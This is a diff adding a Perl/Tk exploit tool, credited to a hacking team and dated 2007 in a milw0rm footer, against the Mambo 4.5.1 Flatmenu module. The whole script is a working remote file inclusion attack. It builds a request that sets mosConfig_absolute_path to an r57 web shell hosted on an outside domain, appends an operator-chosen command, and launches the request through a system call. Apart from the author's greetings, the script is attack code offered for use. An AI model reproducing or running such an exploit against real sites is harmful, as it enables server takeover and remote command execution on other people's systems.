@@ -1,0 +1,92 @@
+#!/usr/bin/perl
+
+#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#+
+#-   - - [The Best Arab Security And Hacking Team] - -
+#+
+#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#+
+#- Mambo 4.5.1 Modules Flatmenu <= 1.07 Remote File Include Exploit
+#+
+#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#+
+#- [Script name: Flatmenu 1.07 for Mambo 4.5.1
+#- [Script site: http://mamboxchange.com/frs/download.php/2376/Flatmenu10b07_451_1.zip
+#+
+#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+#+
+#-            Coded And Found By Coldz3ro
+#-           Cold-z3ro[at]hotmail[dot]com
+#-                 Ilove You HanaH
+#+      Big thanks For You My Love Greeneyes_Amor
+#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+use Tk;
+use Tk::DialogBox;
+use LWP::UserAgent;
+
+$mw = new MainWindow(title => "Team Hell Crew :: Mambo 4.5.1 Modules Flatmenu <= 1.07 Remote File Include Exploit :: by Cold z3ro ;-)  " );
+$mw->geometry ( '500x300' ) ;
+$mw->resizable(0,0);
+
+$mw->Label(-text => 'Mambo 4.5.1 Modules Flatmenu <= 1.07 Remote File 
+Include Exploit', -font => '{Verdana} 7 bold',-foreground=>'blue')->pack();
+$mw->Label(-text => '')->pack();
+
+$fleft=$mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ;
+$fright=$mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;
+
+$url = 'http://www.site.com/[Mambo_path]/modules/mod_flatmenu.php?mosConfig_absolute_path=';
+$shell_path = 'http://nachrichtenmann.de/r57.txt?';
+$cmd = 'ls -la';
+
+
+$fleft->Label ( -text => 'Script Path: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
+$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$url) ->pack ( -side => "top" , -anchor => 'w' ) ;
+
+$fleft->Label ( -text => 'Shell Path: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => "top" , -anchor => 'e' ) ;
+$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$shell_path) ->pack ( -side => "top" , -anchor => 'w' ) ;
+
+$fleft->Label ( -text => 'CMD: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
+$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$cmd) ->pack ( -side => "top" , -anchor => 'w' ) ;
+
+$fright->Label( -text => ' ')->pack();
+$fleft->Label( -text => ' ')->pack();
+
+
+
+$fright->Button(-text    => 'Exploit Include Vulnerability',
+               -relief => "groove",
+               -width => '30',
+               -font => '{Verdana} 8 bold',
+               -activeforeground => 'red',
+               -command => \&akcja
+              )->pack();
+
+
+$fright->Label( -text => ' ')->pack();
+$fright->Label( -text => 'Exploit Coded By Cold z3ro [Wasem898]', -font => '{Verdana} 7')->pack();
+$fright->Label( -text => 'Team Hell Crew :: The Best Arab Security And Hacking Team', -font => '{Verdana} 7')->pack();
+$fright->Label( -text => 'Cold-z3ro@hotmail.com', -font => '{Verdana} 7')->pack();
+$fright->Label( -text => ' Long Life My Home Land Palestine', -font => '{Verdana} 7')->pack();
+$fright->Label( -text => ' ~~\Big thanks For You My Love Greeneyes_Amor/~~', -font => '{Verdana} 7')->pack();
+MainLoop();
+
+sub akcja()
+{
+$InfoWindow=$mw->DialogBox(-title   => 'Team Hell Crew :: Exploit by Cold 
+z3ro ;-) ', -buttons => ["OK"]);
+$InfoWindow->add('Label', -text => ' For help Cold-z3ro@hotmail.com #Team Hell', -font => '{Verdana} 8')->pack;
+$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
+$InfoWindow->add('Label', -text => 'Team Hell Site: http://www.Hack-teach.com/', -font => '{Verdana} 8')->pack;
+$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
+$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
+$InfoWindow->add('Label', -text => 'Greetz For my friends ;-)', -font => '{Verdana} 8')->pack;
+$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
+
+system("start $url$shell_path$cmd");
+$InfoWindow->Show();
+}
+# www.Hack-Teach.com , www.4azhar.com ]
+
+# milw0rm.com [2007-03-25]
